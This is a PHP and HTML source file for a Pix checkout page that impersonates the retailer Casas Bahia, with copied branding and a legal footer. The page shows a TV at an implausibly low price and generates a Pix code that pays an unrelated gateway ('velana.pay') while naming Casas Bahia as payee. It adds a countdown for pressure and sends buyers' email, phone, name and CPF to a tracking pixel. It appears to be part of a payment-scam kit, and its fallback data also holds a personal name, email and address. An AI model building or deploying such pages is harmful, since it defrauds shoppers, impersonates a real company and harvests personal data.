<?php
require_once __DIR__ . '/config/database.php';
require_once __DIR__ . '/includes/domain_guard.php';
checkDomainAccess();
require_once __DIR__ . '/includes/pixel_tracker.php';

$db = getDBConnection();
$orderId = isset($_GET['order_id']) ? intval($_GET['order_id']) : 0;

$order = null;
if ($orderId > 0) {
    try {
        $stmt = $db->prepare("SELECT * FROM orders WHERE id = :id LIMIT 1");
        $stmt->execute(['id' => $orderId]);
        $order = $stmt->fetch();
    } catch (Exception $e) {}
}

if (!$order) {
    try {
        $stmt = $db->query("SELECT * FROM orders ORDER BY id DESC LIMIT 1");
        $order = $stmt->fetch();
    } catch (Exception $e) {}
}

if (!$order) {
    $order = [
        'id' => 522837993,
        'product_title' => 'Smart TV 43 AOC Full HD Wi-Fi Roku TV',
        'product_price' => 44.82,
        'client_name' => 'Jonas Lima Teixeira',
        'client_email' => 'mgsupabase@gmail.com',
        'shipping_address' => 'GERAL, 43 - ambrosio, Garopaba - SC, 88495-000',
        'pix_code' => '00020101021226770014BR.GOV.BCB.PIX2555velana.pay/pix/522837993520400005303986540444.825802BR5915CASAS BAHIA S A6009SAO PAULO62070503***6304A1B2',
        'created_at' => date('Y-m-d H:i:s')
    ];
}

$baseOrderOffset = 522837993;
if ($order && intval($order['id']) < $baseOrderOffset) {
    $order['id'] = $baseOrderOffset + intval($order['id']);
}

$pixCode = $order['pix_code'] ?: '00020101021226770014BR.GOV.BCB.PIX2555velana.pay/pix/522837993520400005303986540444.825802BR5915CASAS BAHIA S A6009SAO PAULO62070503***6304A1B2';
$qrCodeUrl = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=" . urlencode($pixCode);

$clientEmail = !empty($order['client_email']) ? $order['client_email'] : 'mgsupabase@gmail.com';
$maskedEmail = $clientEmail;


$payUntilTimestamp = strtotime('+10 minutes');
$payUntilFormatted = date('d/m/Y', $payUntilTimestamp) . ' às ' . date('H\hi', $payUntilTimestamp);

$currentStatus = trim($order['payment_status'] ?? '');
$isOrderPaid = in_array(strtolower($currentStatus), ['pago', 'pagamento confirmado', 'aprovado', 'paid', 'approved', 'confirmed', 'completed', 'paid_out']) || (isset($_GET['paid']) && $_GET['paid'] == '1');

// Endereço salvo do pedido
$rawAddr = !empty($order['shipping_address']) ? $order['shipping_address'] : 'GERAL, 43 - ambrosio, Garopaba, SC, 88495-000';
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Pagamento Pix | Casas Bahia</title>
  <link rel="icon" href="https://www.casasbahia.com.br/favicon.ico">
  <?php 
  $pixelUserData = [
      'email' => $order['client_email'] ?? '',
      'phone' => $order['client_phone'] ?? '',
      'name'  => $order['client_name'] ?? '',
      'cpf'   => $order['client_cpf'] ?? ''
  ];
  $pixelEventData = [
      'value' => (float)$order['product_price'],
      'currency' => 'BRL',
      'order_id' => (string)$order['id'],
      'content_name' => $order['product_title'] ?? 'Produto Casas Bahia',
      'content_ids' => [strval($order['product_id'] ?? $order['id'])],
      'content_type' => 'product',
      'num_items' => 1
  ];
  renderFacebookPixel('Purchase', $pixelEventData, $pixelUserData); 
  ?>
  <style>
    :root {
      --cb-blue: #003399;
      --cb-red: #e30613;
      --cb-green: #168019;
      --cb-bg: #ffffff;
      --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: var(--font-family); }
    body { background-color: var(--cb-bg); color: #0f172a; padding-bottom: 50px; -webkit-font-smoothing: antialiased; }

    /* LINHA VERMELHA TOPO */
    .top-red-line { height: 4px; background-color: var(--cb-red); width: 100%; }

    /* HEADER */
    header { background: #000000; padding: 14px 16px; border-bottom: 1px solid #111111; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
    .brand-logo { font-size: 20px; font-weight: 900; color: #ffffff; text-decoration: none; letter-spacing: -0.5px; }
    .brand-logo span { color: #ffffff; }
    .accessibility-icon { color: #ffffff; display: flex; align-items: center; cursor: pointer; }
    .accessibility-icon svg { stroke: #ffffff !important; }
    .accessibility-icon svg circle:nth-child(2) { fill: #ffffff !important; }

    /* HERO VERDE DO PEDIDO (FOTO MEDIA_1787977434671.JPG) */
    .green-hero-banner { background-color: var(--cb-green); color: #ffffff; padding: 32px 16px 28px 16px; text-align: center; }
    .checkmark-circle { width: 44px; height: 44px; background: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 14px auto; }
    .order-number-hero { font-size: 24px; font-weight: 800; letter-spacing: 0.5px; margin-bottom: 6px; }
    .hero-subtext { font-size: 15px; font-weight: 400; opacity: 0.95; margin-bottom: 20px; }
    .hero-headline { font-size: 22px; font-weight: 800; line-height: 1.35; max-width: 320px; margin: 0 auto; }

    /* CONTAINER PRINCIPAL DO CHECKOUT PIX */
    .pix-checkout-container { max-width: 480px; margin: 0 auto; padding: 20px 16px; }

    /* TAG PAGAMENTO PENDENTE (FOTO MEDIA_1787977434671.JPG) */
    .status-badge-wrapper { display: flex; justify-content: center; margin-bottom: 20px; }
    .status-badge-pending { background-color: #f59e0b; color: #000000; font-weight: 700; font-size: 15px; padding: 6px 20px; border-radius: 6px; }

    /* TIMER REGRESSIVO DA VALIDADE DO PIX (FOTO MEDIA_1787977434671.JPG) */
    .timer-expiration-block { text-align: center; margin-bottom: 24px; }
    .timer-clock-row { font-size: 15px; color: #0f172a; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 4px; }
    .timer-clock-val { font-size: 16px; font-weight: 800; color: #0f172a; }
    .pay-until-date { font-size: 13px; color: #64748b; }

    /* QR CODE (FOTO MEDIA_1787977434671.JPG) */
    .qr-code-box { text-align: center; margin-bottom: 24px; }
    .qr-code-image { width: 220px; height: 220px; display: inline-block; object-fit: contain; }

    /* CAMPO COPIA E COLA + PREÇO TOTAL (FOTO MEDIA_1787977439383.JPG) */
    .copia-cola-input-field { width: 100%; height: 46px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 0 12px; font-size: 14px; font-family: monospace; color: #0f172a; outline: none; background: #ffffff; margin-bottom: 16px; }
    
    .total-price-text-row { text-align: center; font-size: 15px; color: #0f172a; margin-bottom: 18px; }
    .total-price-text-row strong { font-size: 18px; font-weight: 800; color: var(--cb-blue); }

    .btn-blue-copy-pix {
      width: 100%;
      height: 50px;
      background-color: var(--cb-blue);
      color: #ffffff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      transition: background-color 0.2s, transform 0.1s;
    }
    .btn-blue-copy-pix:active { background-color: #002266; }

    /* INFORMAÇÕES DE ENVIO E AVISOS (FOTO MEDIA_1787977439383.JPG) */
    .notice-info-text { font-size: 14px; color: #475569; line-height: 1.45; margin: 20px 0 12px 0; }
    .link-how-to-pay { font-size: 14px; font-weight: 600; color: var(--cb-blue); text-decoration: underline; cursor: pointer; display: inline-block; margin-bottom: 24px; }

    .important-cancel-notice { font-size: 14px; color: #334155; line-height: 1.5; margin-bottom: 24px; }
    .important-cancel-notice strong { font-weight: 700; color: #0f172a; }

    /* CARD CONFIRMAÇÃO DE E-MAIL (FOTO MEDIA_1787977439383.JPG) */
    .email-confirmation-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 10px; padding: 20px; text-align: center; margin-bottom: 28px; }
    .email-card-text { font-size: 14px; color: #475569; }
    .email-card-masked { font-weight: 800; font-size: 15px; color: #0f172a; margin: 8px 0 18px 0; word-break: break-all; }
    
    .btn-track-order-blue {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      height: 48px;
      background-color: var(--cb-blue);
      color: #ffffff;
      border-radius: 8px;
      font-size: 15px;
      font-weight: 700;
      text-decoration: none;
      transition: background-color 0.2s;
    }

    /* SEÇÃO ENDEREÇO E VALOR TOTAL (FOTO MEDIA_1787977444552.JPG) */
    .section-addr-heading { font-size: 15px; font-weight: 700; color: #0f172a; margin-bottom: 8px; }
    .addr-display-card { background: #f8fafc; border-radius: 10px; padding: 16px; margin-bottom: 16px; }
    .addr-display-title { font-size: 14px; font-weight: 700; color: #0f172a; margin-bottom: 4px; }
    .addr-display-line { font-size: 14px; color: #475569; line-height: 1.4; }

    .summary-gray-box { background: #f8fafc; border-radius: 10px; padding: 16px; display: flex; align-items: center; justify-content: space-between; font-size: 15px; color: #0f172a; margin-bottom: 12px; }
    .summary-gray-box span:first-child { font-weight: 400; }
    .summary-gray-box span:last-child { font-weight: 700; }

    /* BOTÃO CONTORNO IR PARA MEUS PEDIDOS (FOTO MEDIA_1787977444552.JPG) */
    .btn-outline-my-orders {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      height: 48px;
      background: #ffffff;
      border: 2px solid var(--cb-blue);
      color: var(--cb-blue);
      border-radius: 8px;
      font-size: 15px;
      font-weight: 700;
      text-decoration: none;
      margin-top: 12px;
      margin-bottom: 28px;
      transition: background-color 0.2s;
    }

    /* RODAPÉ LEGAL CNPJ CASAS BAHIA */
    .legal-footer { margin-top: 36px; padding-top: 20px; border-top: 1px solid #e2e8f0; font-size: 12px; color: #64748b; line-height: 1.65; font-weight: 400; }

    /* MODAL COMO PAGAR COM PIX */
    .how-modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.6); z-index: 2000; display: none; align-items: center; justify-content: center; padding: 16px; }
    .how-modal-card { background: #fff; border-radius: 12px; padding: 20px; max-width: 440px; width: 100%; }
    .how-modal-title { font-size: 16px; font-weight: 700; color: #0f172a; margin-bottom: 12px; }
    .how-modal-step { font-size: 14px; color: #334155; margin-bottom: 8px; line-height: 1.4; }
    .btn-close-how { width: 100%; height: 42px; background: var(--cb-blue); color: #fff; border: none; border-radius: 6px; font-weight: 700; margin-top: 14px; cursor: pointer; }
  </style>
</head>
<body>

  <!-- TOPO LINHA VERMELHA -->
  <div class="top-red-line"></div>

  <!-- HEADER -->
  <header>
    <a href="home.php" class="brand-logo">CASAS<span>BAHIA</span></a>
    <div class="accessibility-icon" title="Acessibilidade">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#003399" stroke-width="1.8">
        <circle cx="12" cy="12" r="10"/>
        <circle cx="12" cy="6.5" r="1.5" fill="#003399" stroke="none"/>
        <path d="M7 10.5h10M12 10.5v5M9.5 19.5l2.5-4 2.5 4" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
  </header>

  <!-- HERO VERDE DO PEDIDO (FOTO MEDIA_1787977434671.JPG & MEDIA_1788014731058.JPG) -->
  <div class="green-hero-banner" id="greenHeroBanner">
    <div class="checkmark-circle">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#168019" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="20 6 9 17 4 12"/>
      </svg>
    </div>

    <div class="order-number-hero" id="displayHeroOrderId"><?= htmlspecialchars($order['id']) ?></div>
    <div class="hero-subtext" id="displayHeroSubtext">Recebemos seu pedido, obrigado.</div>
    <h1 class="hero-headline" id="displayHeroHeadline"><?= $isOrderPaid ? 'Pedido realizado com sucesso!' : 'Pague o Pix para garantir seu pedido' ?></h1>
  </div>

  <div class="pix-checkout-container">

    <!-- TAG PAGAMENTO -->
    <div class="status-badge-wrapper">
      <?php if ($isOrderPaid): ?>
        <span class="status-badge-pending" style="background-color: #16a34a; color: #ffffff;">Pagamento aprovado</span>
      <?php else: ?>
        <span class="status-badge-pending">Pagamento pendente</span>
      <?php endif; ?>
    </div>

    <?php if (!$isOrderPaid): ?>
      <!-- TIMER REGRESSIVO (FOTO MEDIA_1787977434671.JPG) -->
      <div class="timer-expiration-block">
        <div class="timer-clock-row">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0f172a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="10"/>
            <polyline points="12 6 12 12 16 14"/>
          </svg>
          <span>Esse código expira em <strong class="timer-clock-val" id="pixCountdownClock">09:59:49</strong></span>
        </div>
        <div class="pay-until-date">Pague até <?= $payUntilFormatted ?></div>
      </div>

      <!-- QR CODE (FOTO MEDIA_1787977434671.JPG) -->
      <div class="qr-code-box">
        <img src="<?= htmlspecialchars($qrCodeUrl) ?>" alt="QR Code Pix" class="qr-code-image">
      </div>

      <!-- CAMPO COPIA E COLA + PREÇO TOTAL (FOTO MEDIA_1787977439383.JPG) -->
      <input type="text" id="pixCodeInput" class="copia-cola-input-field" value="<?= htmlspecialchars($pixCode) ?>" readonly onclick="this.select()">

      <div class="total-price-text-row">
        Valor total <strong>R$ <?= number_format($order['product_price'], 2, ',', '.') ?></strong>
      </div>

      <button type="button" class="btn-blue-copy-pix" id="btnCopyPix" onclick="copyPixCode()">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
          <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
        </svg>
        <span id="btnCopyTxt">Copiar código Pix</span>
      </button>

      <!-- AVISOS E LINK DE AJUDA (FOTO MEDIA_1787977439383.JPG) -->
      <div class="notice-info-text">
        O <strong>código Pix</strong> também será enviado para o WhatsApp e e-mail cadastrados.
      </div>

      <a href="#" class="link-how-to-pay" onclick="openHowToPayModal(event)">Como pagar com Pix?</a>

      <div class="important-cancel-notice">
        <strong>Importante:</strong> caso seu pagamento não seja efetivado até o prazo informado, seu pedido será cancelado. O prazo de entrega do produto começa a ser contado a partir dessa confirmação.
      </div>
    <?php endif; ?>

    <!-- CARD CONFIRMAÇÃO DE E-MAIL (FOTO MEDIA_1787977439383.JPG) -->
    <div class="email-confirmation-card">
      <div class="email-card-text">A confirmação do pedido será enviada para o e-mail:</div>
      <div class="email-card-masked" id="displayMaskedEmail"><?= htmlspecialchars($maskedEmail) ?></div>
      <a href="home.php?open_orders=1" class="btn-track-order-blue">Acompanhar meu pedido</a>
    </div>

    <!-- SEÇÃO ENDEREÇO E RESUMO (FOTO MEDIA_1787977444552.JPG) -->
    <div class="section-addr-heading">Endereço</div>

    <div class="addr-display-card">
      <div class="addr-display-title" id="dispAddrTitle">Geral</div>
      <div class="addr-display-line" id="dispAddrLine1">GERAL, 43</div>
      <div class="addr-display-line" id="dispAddrLine2">ambrosio, Garopaba, SC, 88495-000</div>
    </div>

    <div class="summary-gray-box">
      <span>Pix</span>
      <span>R$ <?= number_format($order['product_price'], 2, ',', '.') ?></span>
    </div>

    <div class="summary-gray-box">
      <span>Valor total</span>
      <span>R$ <?= number_format($order['product_price'], 2, ',', '.') ?></span>
    </div>

    <a href="home.php?open_orders=1" class="btn-outline-my-orders">Ir para meus pedidos</a>

    <!-- RODAPÉ LEGAL CNPJ CASAS BAHIA -->
    <div class="legal-footer">
      Grupo Casas Bahia S.A. | www.casasbahia.com.br | Rua Florida, 1970 | São Paulo - SP | CEP: 04565-001 | CNPJ: 33.041.260/0652-90 | Inscrição Estadual: 133.091.229.115
    </div>

  </div>

  <!-- MODAL COMO PAGAR COM PIX -->
  <div class="how-modal-overlay" id="howToPayModalOverlay" onclick="closeHowToPayModal(event)">
    <div class="how-modal-card" onclick="event.stopPropagation()">
      <div class="how-modal-title">Como pagar com o Pix:</div>
      <div class="how-modal-step">1. Abra o aplicativo do seu banco no celular (Nubank, Itaú, Bradesco, etc).</div>
      <div class="how-modal-step">2. Escolha a opção <strong>Pix</strong> e selecione <strong>Pix Copia e Cola</strong>.</div>
      <div class="how-modal-step">3. Cole o código copiado nesta página.</div>
      <div class="how-modal-step">4. Confirme o valor e conclua o pagamento. A aprovação é imediata!</div>
      <button type="button" class="btn-close-how" onclick="closeHowToPayModal(event)">Entendi</button>
    </div>
  </div>

  <script>
    function copyPixCode() {
      var pixInput = document.getElementById('pixCodeInput');
      pixInput.select();
      pixInput.setSelectionRange(0, 99999);
      
      try {
        if (navigator.clipboard && window.isSecureContext) {
          navigator.clipboard.writeText(pixInput.value);
        } else {
          document.execCommand('copy');
        }
      } catch (e) {
        document.execCommand('copy');
      }

      var btnTxt = document.getElementById('btnCopyTxt');
      btnTxt.textContent = '✓ Código Pix Copiado!';

      setTimeout(function() {
        btnTxt.textContent = 'Copiar código Pix';
      }, 3000);
    }

    function openHowToPayModal(e) {
      if (e) e.preventDefault();
      var modal = document.getElementById('howToPayModalOverlay');
      if (modal) modal.style.display = 'flex';
    }

    function closeHowToPayModal(e) {
      if (e) e.stopPropagation();
      var modal = document.getElementById('howToPayModalOverlay');
      if (modal) modal.style.display = 'none';
    }

    // Cronômetro Regressivo 10 Minutos (Formato 09:59:49)
    var totalSeconds = (9 * 3600) + (59 * 60) + 49;
    var clockElem = document.getElementById('pixCountdownClock');

    setInterval(function() {
      if (totalSeconds <= 0) return;
      totalSeconds--;

      var hrs = Math.floor(totalSeconds / 3600);
      var mins = Math.floor((totalSeconds % 3600) / 60);
      var secs = totalSeconds % 60;

      var strH = hrs < 10 ? '0' + hrs : hrs;
      var strM = mins < 10 ? '0' + mins : mins;
      var strS = secs < 10 ? '0' + secs : secs;

      if (clockElem) {
        clockElem.textContent = strH + ':' + strM + ':' + strS;
      }
    }, 1000);

    // Função de mascaramento dinâmico de e-mail do cliente
    function maskCustomerEmail(email) {
      if (!email || email.indexOf('@') === -1) return 'm**********x@g***l.com';
      var parts = email.split('@');
      var user = parts[0];
      var domain = parts[1];

      var maskedUser = '';
      if (user.length <= 2) {
        maskedUser = user[0] + '***';
      } else {
        maskedUser = user[0] + '**********' + user[user.length - 1];
      }

      var dParts = domain.split('.');
      var dName = dParts[0];
      var dExt = dParts.slice(1).join('.');

      var maskedDomain = '';
      if (dName.length <= 2) {
        maskedDomain = dName[0] + '***.' + dExt;
      } else {
        maskedDomain = dName[0] + '***' + dName[dName.length - 1] + '.' + dExt;
      }

      return maskedUser + '@' + maskedDomain;
    }

    // Carregar e-mail e endereço REAIS do cliente salvos no localStorage do checkout
    document.addEventListener('DOMContentLoaded', function() {
      var saved = localStorage.getItem('savedAddressData');
      if (saved) {
        try {
          var data = JSON.parse(saved);
          if (data) {
            var street = data.street || '';
            var number = data.number || 'S/N';
            var neighborhood = data.neighborhood || '';
            var city = data.city || '';
            var state = data.state || '';
            var cep = data.cep || '';
            var email = data.email || '';

            if (street) {
              var titleElem = document.getElementById('dispAddrTitle');
              var line1Elem = document.getElementById('dispAddrLine1');
              var line2Elem = document.getElementById('dispAddrLine2');

              if (titleElem) titleElem.textContent = street;
              if (line1Elem) line1Elem.textContent = street.toUpperCase() + ', ' + number;

              var parts2 = [];
              if (neighborhood) parts2.push(neighborhood);
              if (city) parts2.push(city);
              if (state) parts2.push(state);
              if (cep) parts2.push(cep);
              if (line2Elem) line2Elem.textContent = parts2.join(', ');
            }

            if (email) {
              var emailElem = document.getElementById('displayMaskedEmail');
              if (emailElem) {
                emailElem.textContent = email;
              }
            }
          }
        } catch(e) {}
      }
    });

    // Verificação de Pagamento em Tempo Real (Respostas Instantâneas a cada 1 segundo)
    var phpOrderId = <?= intval($order['id']) ?>;
    var localOrderId = 0;
    try {
      var urlParams = new URLSearchParams(window.location.search);
      var urlId = urlParams.get('order_id') || urlParams.get('id');
      if (urlId && parseInt(urlId) > 0) {
        localOrderId = parseInt(urlId);
      } else {
        var s = localStorage.getItem('last_order_id');
        if (s && parseInt(s) > 0) localOrderId = parseInt(s);
      }
    } catch(e) {}

    var currentOrderId = (localOrderId > 0) ? localOrderId : phpOrderId;
    var isAlreadyPaid = <?= $isOrderPaid ? 'true' : 'false' ?>;

    async function checkPixPaymentStatus() {
      if (currentOrderId <= 0 || isAlreadyPaid) return;
      try {
        let res = await fetch('api/check_status.php?order_id=' + currentOrderId + '&_t=' + new Date().getTime(), {
          cache: 'no-store',
          headers: { 'Cache-Control': 'no-cache' }
        });
        if (!res.ok) {
          res = await fetch('/api/check_status.php?order_id=' + currentOrderId + '&_t=' + new Date().getTime(), {
            cache: 'no-store',
            headers: { 'Cache-Control': 'no-cache' }
          });
        }
        if (res.ok) {
          const data = await res.json();
          if (data && (data.paid === true || data.status === 'PAID')) {
            isAlreadyPaid = true;
            
            // 1. Atualizar título do banner topo na hora
            var headline = document.getElementById('displayHeroHeadline');
            if (headline) headline.textContent = 'Pedido realizado com sucesso!';

            // 2. Mudar badge amarelo para verde "Pagamento aprovado" na hora
            var badgeWrapper = document.querySelector('.status-badge-wrapper');
            if (badgeWrapper) {
              badgeWrapper.innerHTML = '<span class="status-badge-pending" style="background-color: #16a34a; color: #ffffff;">Pagamento aprovado</span>';
            }

            // 3. Ocultar QR Code, Temporizador e Copia e Cola na hora
            var elementsToHide = [
              '.timer-expiration-block',
              '.qr-code-box',
              '#pixCodeInput',
              '.total-price-text-row',
              '#btnCopyPix',
              '.notice-info-text',
              '.link-how-to-pay',
              '.important-cancel-notice'
            ];

            elementsToHide.forEach(function(selector) {
              var elem = document.querySelector(selector);
              if (elem) elem.style.display = 'none';
            });

            // 4. Redirecionar/Recarregar para a URL permanente com paid=1
            setTimeout(function() {
              window.location.href = 'pix.php?order_id=' + currentOrderId + '&paid=1';
            }, 400);
          }
        }
      } catch (e) {}
    }

    if (!isAlreadyPaid) {
      checkPixPaymentStatus();
      setInterval(checkPixPaymentStatus, 1000);
    }

    function sendActivityPulse(pageName) {
      try { fetch('api/tracker.php?page=' + encodeURIComponent(pageName)); } catch (e) {}
    }
    sendActivityPulse('pix.php');
    setInterval(function() { sendActivityPulse('pix.php'); }, 8000);
  </script>
</body>
</html>
